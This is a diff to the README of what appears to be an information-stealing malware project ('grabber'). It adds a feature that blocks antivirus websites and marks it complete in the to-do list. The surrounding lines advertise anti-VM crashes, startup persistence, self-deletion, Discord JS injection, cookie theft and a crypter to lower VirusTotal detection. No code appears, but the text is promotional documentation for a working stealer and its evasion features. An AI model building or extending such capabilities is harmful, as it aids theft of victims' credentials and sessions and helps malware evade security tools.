@@ -70,6 +70,7 @@
 | **BSOD** | Triggers Blue Screen of Death when ran on Virtual Machine. |
 | **Startup** | Runs the stub on Windows starup. |
 | **Delete Self** | Deletes the grabber after use. |
+| **Block AV Sites** | Blocks AV related sites. [Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117) |
 | **Message Box** | Create custom message box. |
 
 **Supports:** *Windows 10/11 (untested)*
@@ -100,7 +101,7 @@
 - [x] Remove some features because they cause bugs.
 - [x] Discord JS Injection.
 - [x] Importable Cookies.
-- [ ] Block Virustotal and other sites.
+- [x] Block AV Sites.
 
 <!--## Crypter
    Use Blankrypt to reduce VirusTotal detection.
